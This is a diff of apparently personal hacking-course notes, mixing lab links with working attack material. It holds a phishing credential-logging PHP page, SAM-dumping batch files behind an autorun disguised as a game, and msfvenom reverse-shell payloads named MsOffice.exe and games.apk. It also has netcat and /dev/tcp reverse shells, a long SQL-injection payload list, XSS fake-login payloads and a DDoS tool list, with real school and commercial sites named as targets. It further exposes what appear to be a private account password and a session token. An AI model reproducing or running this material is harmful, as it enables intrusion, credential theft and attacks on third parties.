@@ -1,154 +1,90 @@
-All knowledge is parallel : https://0x00sec.org/t/knowledge-is-free/6270
-CEH All in one Matt Walker : https://drive.google.com/open?id=1dt7VVJWXEkp_6vAAMnuEx7ZaG_KxPJQV
+Lab Setup:
+Virtualbox : https://www.virtualbox.org/
+Normal Download : https://images.offensive-security.com/virtual-images/kali-linux-2019.4-vbox-i386.ova
+Torrent : https://images.offensive-security.com/virtual-images/kali-linux-2019.4-vbox-i386.ova.torrent
+Metasploitableb : https://sourceforge.net/projects/metasploitable/
+Kioptrix (Download level 1& 2): https://drive.google.com/open?id=1rlR7x5BXKpCXA3097WeYiw3sJ_DOVnPe
+IMPORT ALL MACHINES INTO YOU VM AND SET UP A NAT NETWORK.
+Reference: https://www.techrepublic.com/article/how-to-create-multiple-nat-networks-in-virtualbox/
+https://nmap.org/download.html
 
-VM - 
-https://www.virtualbox.org/
-https://www.offensive-security.com/kali-linux-vm-vmware-virtualbox-image-download/
+https://github.com/Karma47/temp/blob/master/hello.txt
+Telegram : https://t.me/joinchat/JuMrIFHqY5-hvkVQNBCFEw
 
-Kali Linux Module One:
-https://mega.nz/#F!1sxXWILY!eOPqeuAeruHYvthrHaM1gA
+Dirsearch : https://github.com/maurosoria/dirsearch
+Kali Module 1: https://mega.nz/#F!1sxXWILY!eOPqeuAeruHYvthrHaM1gA
+Kali Module 2: https://mega.nz/#F!YxYBFKpJ!zJwq4k-PbOeSRpCUWvF5fw
+Kali Linux : http://www.mediafire.com/file/88gkxa0xlnq8vts/Kali_linux.zip/file
 
-Kali linux Module two:
-https://mega.nz/#F!YxYBFKpJ!zJwq4k-PbOeSRpCUWvF5fw
+Videos:
+https://www.bbc.co.uk/news/av/stories-51660982/criminals-on-cctv-scammers-caught-red-handed
+IOT: https://www.youtube.com/watch?v=sgMG7zRrcPk
+Nmap :https://www.youtube.com/watch?v=fi44mL7mcq0
+social eng: https://www.youtube.com/watch?v=lc7scxvKQOo
+its all about the coders: https://www.youtube.com/watch?v=fi44mL7mcq0&t=18s
+Deepfake:
+https://www.instagram.com/bill_posters_uk/?hl=en
+https://www.youtube.com/watch?v=gsv1OsCEad0
 
-Discord - https://discord.gg/MJ6PR2
+Archive
+https://web.archive.org/
 
-Burp Suite Tutorial : https://hackademy.aetherlab.net/
-                      https://www.youtube.com/watch?v=U-MkNsHPU_I&feature=youtu.be
-                      
-SMS BOMB - https://github.com/TheSpeedX/TBomb
-DOS - slowloris: https://github.com/llaera/slowloris.pl
+Deepdotwebers/
+https://www.deepdotweb.com/jolly-rogers-security-guide-for-beginners/
+https://web.archive.org/web/20180127030756/https://www.deepdotweb.com/jolly-rogers-security-guide-for-beginners/
 
-A nice youtube channel : https://www.youtube.com/channel/UCPeJcqbi8v46Adk59plaaXg
-
-Kali LInux Resource:
-https://mega.nz/#F!qEthVCjS!AsSx6gs6eWYD2LXN4e6Hzg
-
-CompTIA Security+
-http://www.mediafire.com/file/669rh6q3n3svqlq/CompTIA_Study_Material.rar/file
-
-Steg - Monolisa https://drive.google.com/open?id=1yJ8pbTbZq4dswUZ1lTn81R3cStrp0zcT
-forest - https://drive.google.com/open?id=11Z5wGr7yb4WIdgF3IwhUjwqsvTyR5J5n
-old is gold - https://drive.google.com/open?id=1A3rw_jaWvBOSrAz3eF9zgmHukbifKnR1
-
-CEH Lab - https://drive.google.com/open?id=1a2oNbWoiMmt_0E7k0bCe_pvKwqIidjV0
-
-Overthe wire bandit - https://overthewire.org/wargames/bandit/
-Over the wire bandit help / tutorial - https://www.youtube.com/watch?v=PRAjBlys-7g&list=PL1H1sBF1VAKUsYdQd94dO9MgSaY2p1AJ4
-
+IEEE:
 https://www.computer.org/cms/CYBSI/docs/Top-10-Flaws.pdf
 
-Delme Virus:
+DNS Dumpster:
+https://dnsdumpster.com/
 
-Mega Bastard : To download from Mega bypassing the Mega download limit use Mega Bastard
-https://github.com/tonikelope/megabasterd
+STRIDE and DREAD :
+https://cybersecuritybase.mooc.fi/module-1/6-stride
 
-IEEE - Archive
-https://www.computer.org/cms/CYBSI/docs/Top-10-Flaws.pdf
+Vulns:
+National Vulnerability Database (nvd.nist.gov) 
+​Securitytracker (www.securitytracker.com)
 
+GHDB:
+https://www.exploit-db.com/google-hacking-database
+site:https://docs.google.com/document/d/ password
+site:http://drive.google.com +“drive/folders”
+intext:"@gmail.com" intext:"password" inurl:/files/ ext:txt
+intext:webcam 7 inurl:8080
+http://103.93.185.225/#!/usage
+Cliton Foundation : https://drive.google.com/drive/folders/0BxhYOtObFLfiUzYzNUxLMGY4eGM
+Trump Foundation : 
 
-Windows Password Hack USB
-@echo off
-reg save hklm\sam c:\sam
-reg save hklm\system c:system
-reg save hklm\software c:\software
-copy "C:\sam" "%~dp0"
-copy "C:\system" "~%dp0"
-copy "C:\software" "~%dp0"
-exit
+haveibeenpwned:
+https://haveibeenpwned.com/
 
-[autorun]
-icon=twitter.ico
-open=samfile.bat
-action=Click ok to Run game
-shell\open\command=samfile.bat
-UseAutoPlay=1
+hotstar:box
+kunnal.vasanth@yahoo.com
+Vishnu2014!
 
+Article:    
+https://0x00sec.org/t/random-thoughts-after-nearly-9-years-pentesting-red-teaming-2019/16397
 
+Overthewire
+https://overthewire.org/wargames/bandit/
 
+rev shell:
+https://www.youtube.com/watch?v=UKUi6fomMZE&t=475s 
 
-Windows Pass hack system
+kevin mitik:
+https://www.youtube.com/watch?v=K-96JmC2AkE&t=13s
 
-@echo off
-reg SAVE HKLM\SAM C:\SAM
-reg SAVE HKLM\SYSTEM C:\SYSTEM
-Exit
-
-
-Books : http://ytxmrc3pcbv5464e.onion.ws/files/
-
-Candle :http://gjobqjj7wyczbqie.onion/ 
-
-HiddenWiki : http://zqktlwi4fecvo6ri.onion/wiki/index.php/Main_Page
-
-
-Archive:
-https://greysec.net/showthread.php?tid=31&highlight=archive
-
-
-CEH Exam Questions:
-http://www.aoowe.com/practice-test-312-50-3068.html
-
-https://icedmilocode.wordpress.com/cehexamquestions/
-
-
-SQL injection:
-sqlmap -u testphp.vulnweb.com/listproducts.php?cat=1 --dbs
-
-
-HTML Injection:
-https://auth.mylexia.com/mylexiaLogin?errmsg=Username
-
-
-HTB Devel:
-https://drive.google.com/open?id=1N7ho5OaPpK7DsBlkjmXMWo732S7Gcyy6
-
-PPT 1:
-https://drive.google.com/open?id=1Z1O3hZzSo95068cUPCGASyUeQQlNYq_u
-
-PPT 2:
-https://drive.google.com/open?id=1BJb8neN1aYtYWbgfHPzFDRZ-Ln2OeJUq
-
-
-Kon-Boot
-https://1drv.ms/u/s!Al7JIMNdQ0mtgaYn3TI224gAFT5Brg?e=x091Mf
-
-
-CMD Pass Change:
-STEP 3: Type "net users" in CMD 
-
-STEP 4: Change password for any user by typing "net user <username> <new password>
-
-
-Virus :
-@echo off
-chdir /d %CD%
-copy virus.bat
-start virus.bat
-
-
-HTML Injection:
-<h3>Please login to proceed</h3> 
-<from action=http:192.168.3.255>Username:<br>
-<input type="username" name="username">
-</br>Password:<br><input type="password" name="password"></br>
-<br><input type="submit" value="Logon"></br>
-
-SQL Injection:
-http://testphp.vulnweb.com/listproducts.php?cat=1
-
-Hidden Wiki:
-http://zqktlwi4fecvo6ri.onion/wiki/index.php/Main_Page
-
-https://tinyurl.com/y2soyc6g
-
-http://3g2upl4pq6kufc4m.onion/
-
+Xampp:
+https://www.apachefriends.org/download.html    
 
 Phishing:
+Visit & enter fake details : 
+
+Php Page:
 
 <?php
-header ('Location: facebook.com');
+header ('Location: https://www.facebook.com');
 $handle = fopen("log.txt", "a");
 foreach($_POST as $variable => $value) {
 fwrite($handle, $variable);
@@ -161,4 +97,581 @@ fclose($handle);
 exit;
 ?>
 
+Passwd:
 
+@echo off
+reg SAVE HKLM\SAM C:\SAM
+reg SAVE HKLM\SYSTEM C:\SYSTEM
+
+Exit
+
+Windows Password Hack USB
+@echo off
+reg save hklm\sam c:\sam
+reg save hklm\system c:system
+reg save hklm\software c:\software
+copy "C:\sam" "%~dp0"
+copy "C:\system" "~%dp0"
+copy "C:\software" "~%dp0"
+exit
+
+[autorun]
+icon=twitter.ico
+open=samfile.bat
+action=Click ok to Run game
+shell\open\command=samfile.bat
+UseAutoPlay=1
+
+Tor Browser
+https://www.torproject.org/
+http://privacytools.io/ (important)
+Tor : https://0x00sec.org/t/surfing-the-v01d/16500
+
+Tor Links:
+Books : http://ytxmrc3pcbv5464e.onion/files/
+HiddenWiki : 
+https://0x00sec.org/t/surfing-the-v01d/16500
+https://blankdash.wordpress.com/2019/09/25/surfing-the-v01d/
+
+Stego:
+old is gold: https://drive.google.com/file/d/1A3rw_jaWvBOSrAz3eF9zgmHukbifKnR1/view
+
+Openpuff: http://www.tucows.com/preview/799864/OpenPuff-Steganography-
+
+snow: http://www.darkside.com.au/snow/
+
+Steg - Monolisa https://drive.google.com/open?id=1yJ8pbTbZq4dswUZ1lTn81R3cStrp0zcT
+
+forest - https://drive.google.com/file/d/11Z5wGr7yb4WIdgF3IwhUjwqsvTyR5J5n/view
+
+Cyber sec course :
+https://cybersecuritybase.mooc.fi/
+
+1st - overthewire
+2nd - https://picoctf.com/
+3rd - https://www.root-me.org/?lang=en
+4th - hackthebox / vulnhub
+
+News:
+https://news.ycombinator.com
+https://thehackernews.com/
+https://www.technologyreview.com/
+https://freedom.press/
+https://wildlyinaccurate.com/
+All knowledge is parallel : https://0x00sec.org/t/knowledge-is-free/6270
+https://www.youtube.com/channel/UCPeJcqbi8v46Adk59plaaXg
+https://www.youtube.com/channel/UCWIEIMHXyJ62RF4aVmU30og
+https://www.youtube.com/channel/UC6Om9kAkl32dWlDSNlDS9Iw
+https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA
+https://www.youtube.com/channel/UCG_-mmW9eZJwICp_wImMdsA
+https://www.youtube.com/channel/UCgTNupxATBfWmfehv21ym-g
+https://www.youtube.com/channel/UCW6xlqxSY3gGur4PkGPEUeA
+
+---------------------------------------------------------------------
+Password:
+Rainbow crack : http://project-rainbowcrack.com/
+
+https://exposure.shodan.io/
+
+Windows XP:
+https://www.microsoft.com/en-us/download/details.aspx?id=8002
+
+Windows XP steps:
+https://www.makeuseof.com/tag/download-windows-xp-for-free-and-legally-straight-from-microsoft-si/
+
+Virus :
+@echo off
+chdir /d %CD%
+copy virus.bat
+start virus.bat
+
+Av:
+https://www.immunet.com/index
+https://www.armadito.com/
+https://www.clamav.net/
+
+Blue:
+https://tryhackme.com/room/blue
+
+DDOS:
+Slowloris: https://github.com/llaera/slowloris.pl
+Target - https://www.gniotgroup.edu.in/
+Tbomb: https://github.com/TheSpeedX/TBomb
+https://github.com/royaflash/pentbox
+
+Webapp= http://www.mediafire.com/folder/wf6cd9wcx5he0/webapp
+
+Planet : https://www.planet-source-code.com/
+
+Natas:
+https://overthewire.org/wargames/natas/
+-------------------------------------------------------------------
+Burp & More:
+https://www.youtube.com/user/webpwnized/playlists
+
+Para - manip:
+https://www.kapruka.com/
+
+Session Hijacking:
+https://grabify.link/5RLVWJ
+ci-session token : 7017bd5cd53eeddb4d918665a0b4317703e4dc8d
+
+Temp-Mail:
+https://temp-mail.org/en/
+...................................................................
+Login : https://stopify.co/7AH6Y4.mp4
+
+
+Wireshark Task:
+#1 Enable packet capture
+#2 Visit website : http://exams.kluniversity.in/
+#3 enter login and password
+#4 go to wireshark search for "POST"
+#5 Right click on packet and click follow TCP Stream
+#6 look for uname & pass
+
+Nlist:
+https://nlist.inflibnet.ac.in/
+<i>hello<i>
+<i>hello<i><!--payload
+<marquee>hello<marquee>
+<marquee> Today is Decared a Holiday !<marquee><!--
+
+Target : https://auth.mylexia.com/mylexiaLogin?errmsg=Username
+
+<h3>Please 
+login to proceed</h3> <from action=http://192.168.3.255>Username:<br> <input type="username" name="username"> </br>Password:<br><input type="password" name="password"></br> <br><input type="submit" value="Login"></br>
+Payload all things:
+
+https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection
+<svgonload=alert(1)> - works on planet source code
+
+Payload:
+mylexiaLogin
+
+<script>
+history.replaceState(null, null, '../../../login');
+document.body.innerHTML = "</br></br></br></br></br><h1>Please login to continue</h1><from action=http:192.168.3.255>Username:<br> <input type="username" name="username"> </br>Password:<br><input type="password" name="password"></br> <br><input type="submit" value="Login"
+</script>​
+
+<h3>Please login to proceed</h3> <from action=http://192.168.3.255>Username:<br> <input type="username" name="username"> </br>Password:<br><input type="password" name="password"></br> <br><input type="submit" value="Login"></br>
+
+TARGET : https://www.planet-source-code.com/ - find payload that works
+
+SQL
+https://demo.testfire.net/index.jsp
+http://gdgoenkaschool.in/hwlogin/login.php
+
+jsmith  demo1234
+jsmith'--
+' or 1=1 --'
+
+http://www.avanthi.edu.in/portal/login.php
+' or ''-'
+
+https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
+
+Webgoat:
+https://github.com/WebGoat/WebGoat
+
+SQLMAP Target:
+http://www.altoromutual.com/index.jsp
+jsmith  demo1234
+jsmith'--
+' or 1=1 --'
+
+http://www.avanthi.edu.in/portal/login.php
+' or ''-'
+
+https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
+
+SQLMAP:
+ 1871  sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 --dbs
+ 1872  sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart 
+ 1873  sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart --tables
+ 1874  sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart -T users --columns
+ 1875  sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart -T users -C name,pass,uname,email --dump
+ 1876  sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart -T users -C name,pass,email --dump
+ 1877  sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart -T users -C uname,pass,email --dump
+
+Java_REV_SHELL
+  841  msfvenom -p java/meterpreter/reverse_tcp -f war LHOST=<ip address> LPORT=4444 > shell.war
+
+
+https://www.youtube.com/watch?v=MB_96xLh4As&list=PLZOToVAK85MoBg65au9EeFkK7qwzppcnU
+
+https://www.privacytools.io/
+
+Exam
+https://icedmilocode.wordpress.com/cehexamquestions/
+https://web.archive.org/web/20190617114654/http://www.aoowe.com/practice-test-312-50-3068.html
+
+snow:
+To hide:
+snow -C -m "your message" -p "password" <input file> <output file>
+
+To read msg:
+snow -C -p "password" <output file>
+
+Image:
+https://stopify.co/71F35Z.jpg
+
+passwd:
+https://www.youtube.com/watch?v=K-96JmC2AkE
+
+Loweralpha 6 digit:
+9D08E68828070C69092404ECD2305EF9 - pduaji
+
+Numeric 6 digit:
+CA149370EE9C911C2B7577B9BAE4F896 - 174026
+
+
+Kon-Boot
+https://1drv.ms/u/s!Al7JIMNdQ0mtgaYn3TI224gAFT5Brg?e=x091Mf
+
+netcat:
+http://192.168.3.23/nc.exe
+
+LHOST:
+nc -lvnp <port>
+
+RHOST:
+nc <attacker ip> <port> -e cmd.exe
+
+Payload:
+msfvenom -p windows/shell_reverse_tcp -f exe LHOST=192.168.3.26 LPORT=4444 > MsOffice.exe
+
+Editthiscookie:
+https://chrome.google.com/webstore/detail/editthiscookie/fngmhnnpilhplaeedifhccceomclgfbg?utm_source=chrome-ntp-icon
+
+winhex
+https://www.x-ways.net/winhex/
+
+----------------------------------------------------------------------------------------------------------------------------------
+Paste your session ID here:
+
+
+http://192.168.3.15:8000/Hack_lab_1.7z
+
+
+sOLVE:
+nmap -p- -A (Kioptrix 1 IP)
+
+msfconsole
+use auxiliary/scanner/smb/smb_version
+set RHOST 192.168.56.110
+run
+
+gcc 10.c -o 10
+
+./10 -b 0 192.168.56.110
+
+/bin/bash -i
+
+4d645f88be3697eac86c72c9e58cd322ea951a7dCC - admin
+f633e7c34116deb7684b917f538c8a2650c3e952
+38d3276f7b1ccd3ebc7624fd44c358d6f7197cb3
+
+bad1921952ca6fa9ee06b9178e8cc9876558d642
+
+https://drive.google.com/open?id=1rlR7x5BXKpCXA3097WeYiw3sJ_DOVnPe
+https://sourceforge.net/projects/metasploitable/
+
+Wireshark:
+root@blank:~# # enable sniffing --> iniciate nmap scan from kali 
+root@blank:~# # nmap -sC -sV -A <kaliip/24>
+root@blank:~# # wait for few seconda --> wireshark --> stats -> conv 
+root@blank:~# # analyse the traffic 
+root@blank:~# # enable sniffing 
+root@blank:~# # in windows --> nc -lvnp 4444 -e cmd.exe
+root@blank:~# # in linux --> nc <windows ip> 4444
+root@blank:~# # run some commands and look in wireshark 
+root@blank:~# # filter --> tcp.port==4444 --> right click --> follow tcp
+root@blank:~# # in windows --> nc -lvnp 4444 -e cmd.exe --ssl
+root@blank:~# # in linux --> nc <win ip> 4444 --ssl --> run some win commands
+root@blank:~# # look at results in wireshark --> follow tcp 
+
+                                                                         
+watch : https://www.youtube.com/watch?v=sgMG7zRrcPk
+
+root@blank:~/Downloads# # msfvenom -lp | grep windows
+root@blank:~/Downloads# # msfvenom -p windows/shell_reverse_tcp -f exe LHOST=<kali ip> LPORT=4444 -o MsOffice.exe
+root@blank:~/Downloads# # deploy the malware in your windows machine .. 
+root@blank:~/Downloads# # python3 -m http.server 
+root@blank:~/Downloads# # visit kali_ip:8000 to download malware .. 
+root@blank:~/Downloads# #set up nc in kali --> nc -lvnp 4444
+root@blank:~/Downloads# # access malware from windows --> you gain shell access 
+root@blank:~/Downloads# # msfvenom -lp | grep android 
+root@blank:~/Downloads# # msfconsole --> new terminal // 
+root@blank:~/Downloads# #use exploit/multi/handler
+root@blank:~/Downloads# # set payload android/meterpreter_reverse_tcp --> set lhost
+root@blank:~/Downloads# # msfvenom -p android/meterpreter_reverse_tcp -f raw  LPORT=4444 -o games.apk
+root@blank:~/Downloads# # exploit ( in msfconsole)
+root@blank:~/Downloads# # you gains shell access --> type "help" for options
+
+Iptables:
+root@blank:~/Downloads# # iptables -L
+root@blank:~/Downloads# # ping from windows to kali
+root@blank:~/Downloads# # iptables -P INPUT DROP 
+root@blank:~/Downloads# # ping from windows to kali 
+root@blank:~/Downloads# # iptables -P INPUT ACCEPT
+root@blank:~/Downloads# # iptables -P OUTPUT DROP 
+root@blank:~/Downloads# # tshark | grep ICMP
+root@blank:~/Downloads# # ping from windows to kali
+root@blank:~/Downloads# # iptables -P OUTPUT ACCEPT
+root@blank:~/Downloads# 
+
+
+root@blank:~/Documents# # ls /usr/share/webshells/
+root@blank:~/Documents# # cp /usr/share/webshells/php/php-reverse-shell.php <filename.php>
+root@blank:~/Documents# # nmap -sC -sV 192.168.31.222
+root@blank:~/Documents# # ftp 192.168.31.222 2121
+root@blank:~/Documents# # login with user &  user
+root@blank:~/Documents# # cd /var/www/dav
+root@blank:~/Documents# # put <file.php> --> make sure you edited the file to your ip and port before upoading.
+root@blank:~/Documents# # set up nc --> nc -lvnp 4444
+root@blank:~/Documents# # visit browser and traverse to directory
+root@blank:~/Documents# # 192.168.31.222/dav --> access the php file 
+root@blank:~/Documents# # you gain a limited shell access 
+root@blank:~/Documents# 
+
+
+https://www.youtube.com/watch?v=BHHCvcCUOWU
+
+Directory Traversal:
+root@blank:~# # dotdotpwn -m http -h <target ip>
+root@blank:~# # apt-get intall dotdotpwn -y
+
+Tor:
+root@blank:~# # apt-get install tor -y
+root@blank:~# # service tor start
+root@blank:~# # nano /etc/proxychains.conf --> uncomment dynamic chains
+root@blank:~# # save file 
+root@blank:~# # proxychains firefox --> wil run firefox in proxy 
+root@blank:~# # proxychains <any application> --> will run any app on proxy 
+root@blank:~# 
+root@blank:~# # search for free proxy --> firexproxy 
+root@blank:~# # edit config file --> nano /etc/proxychains.conf
+root@blank:~# # comment tro proxy address --> paste your proxy
+root@blank:~# # in this format --> <protocol> <ip/host> <port>
+root@blank:~# # save file --> run app trhough proxychains
+root@blank:~# # proxychains firefox
+
+Complete 1 in access control and 1 in Reflective and stored XSS:
+Access control --> https://portswigger.net/web-security/access-control
+XSS Reflective --> https://portswigger.net/web-security/cross-site-scripting/reflected
+XSS Stored     --> https://portswigger.net/web-security/cross-site-scripting/stored0
+
+
+Session cookie:
+admin -
+
+burp sqli
+root@blank:~# # foxyporxy --> choose burp exam
+root@blank:~# # burp intercept on --> in firefox search google
+root@blank:~# # forward and drop request --> in burp 
+root@blank:~# # google for http login page --> send request to burp
+root@blank:~# # send to repeater --> modify request and send
+root@blank:~# # right click --> request in browser 
+root@blank:~# # target http://www.avanthi.edu.in/portal/login.php#
+root@blank:~# # send req to burp --> send to intruder 
+root@blank:~# # clear all --> add only uname and password 
+root@blank:~# # paste payloads in payload pages intruder 
+root@blank:~# # start attack --> analyse response --> open in browser 
+
+Kioptrix level01:
+
+Commands:
+
+netdiscover -i eth1
+
+nmap -p- -A (Kioptrix 1 IP)
+
+msfconsole
+use auxiliary/scanner/smb/smb_version
+set RHOST 192.168.56.110
+run
+
+gcc 10.c -o 10
+
+./10 -b 0 192.168.56.110
+
+/bin/bash -i
+
+
+URLs:
+
+https://www.exploit-db.com/exploits/10
+
+Kiportix level02:
+Commands:
+
+netdiscover -i eth1
+
+nmap -p- -A (Kioptrix 2 IP)
+
+
+
+SQLi Payloads:
+'-'
+' '
+'&'
+'^'
+'*'
+' or ''-'
+' or '' '
+' or ''&'
+' or ''^'
+' or ''*'
+"-"
+" "
+"&"
+"^"
+"*"
+" or ""-"
+" or "" "
+" or ""&"
+" or ""^"
+" or ""*"
+or true--
+" or true--
+' or true--
+") or true--
+') or true--
+' or 'x'='x
+') or ('x')=('x
+')) or (('x'))=(('x
+" or "x"="x
+") or ("x")=("x
+")) or (("x"))=(("x
+' or 1=1 --
+or 1=1
+or 1=1--
+or 1=1#
+or 1=1/*
+admin' --
+admin' #
+admin'/*
+admin' or '1'='1
+admin' or '1'='1'--n
+admin' or '1'='1'#
+admin' or '1'='1'/*
+admin'or 1=1 or ''='
+admin' or 1=1
+admin' or 1=1--
+admin' or 1=1#
+admin' or 1=1/*
+admin') or ('1'='1
+admin') or ('1'='1'--
+admin') or ('1'='1'#
+admin') or ('1'='1'/*
+admin') or '1'='1
+admin') or '1'='1'--
+admin') or '1'='1'#
+admin') or '1'='1'/*
+1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
+admin" --
+admin" #
+admin"/*
+admin" or "1"="1
+admin" or "1"="1"--
+admin" or "1"="1"#
+admin" or "1"="1"/*
+admin"or 1=1 or ""="
+admin" or 1=1
+admin" or 1=1--
+admin" or 1=1#
+admin" or 1=1/*
+admin") or ("1"="1
+admin") or ("1"="1"--
+admin") or ("1"="1"#
+admin") or ("1"="1"/*
+admin") or "1"="1
+admin") or "1"="1"--
+admin") or "1"="1"#
+admin") or "1"="1"/*
+1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
+
+nc -nlvp 4444
+
+127.0.0.1; ifconfig
+
+j127.0.0.1; bash -i >& /dev/tcp/192.168.56.101/4444 0>&1
+
+lsb_release -a
+
+uname -a
+
+
+cd /var/www/html
+vi 9545.c
+service apache2 start
+
+cd /tmp
+gcc 9545.c -o 9545
+chmod +x 9545
+./9545
+
+
+
+URLs:
+
+http://burp
+https://www.exploit-db.com/exploits/9545
+
+root@blank:~# # nmap -sP <ip/24>
+root@blank:~# # find ip of kipotix 2 and visit in browser
+root@blank:~# # send login req to burp --> send to intruder
+root@blank:~# # mark uname and pass --> input sql payloads --> launch attack 
+root@blank:~# # look for welcome msg --> req in browser --> you gain access
+root@blank:~# # ping -->127.0.0.1
+root@blank:~# # chain inputs --> 127.0.0.1; ls -la --> it works 
+root@blank:~# # get bash rev shell from pentest monkey 
+root@blank:~# # ping --> 127.0.0.1; bash -i >& /dev/tcp/<your ip>/4444 0>&1
+root@blank:~# # set nc first --> nc -lvnp 4444
+root@blank:~# # you gain a limited shell 
+root@blank:~# # uname -a; lsb_rele142ase -a
+root@blank:~# # searchsploit centos 2.6 --> cp 9545.c exploit
+root@blank:~# # start python server --> python3 -m http.server
+root@blank:~# # from victime dload exploit --> cd /tmp --> wget <ip:800/exploit>
+root@blank:~# # gcc -o exploit <exploit.c> --> ./exploit --> you gain root 
+root@blank:~# # whoami
+
+Day 2:
+whoami; uname -a; pwd; lsb_release -a
+cat /proc/cpuinfo --> gives cpu info
+cat /proc/version --> gives os version details
+cat /etc/passwd   --> reads passwd files to look for users
+cat /etc/shadow   --> reads shadow files to look for pass hashes
+df -a; df -h      --> gives you list of connected devices
+cat /etc/shells   --> gives you list of available shells
+last          --> gives you last login
+ps, ps-aux, top   --> looks for processes 
+dpkg -l           --> lists all installed packages
+route, ifconfig, ip addr --> gives network info
+iptables -L       --> gives firewall rules
+
+E:\\<find pstools in shared drive under enum tools --> extra tools>
+Use win server and enum resuts from win 10
+psinfo 
+psinfo \\<target_ip>
+psinfo -s
+psloggedon
+psloggedon \\<target_ip>
+psserice \\<target_ip> Security EventSystem  
+pslist
+pslist -T
+netstat
+netstat -a
+netstat -a -p UDP
+netstat -a -p TCP
+
+1,4,5,7,8,10,11
+
+
+smbmap -u martin -p apple 10.10.10.16
+
+rpcclient -U Administrator 10.10.10.16
+Enter passwd --> Pa$$w0rd
+enum --> presstab twice to look for options
+run some enum commands and look results.
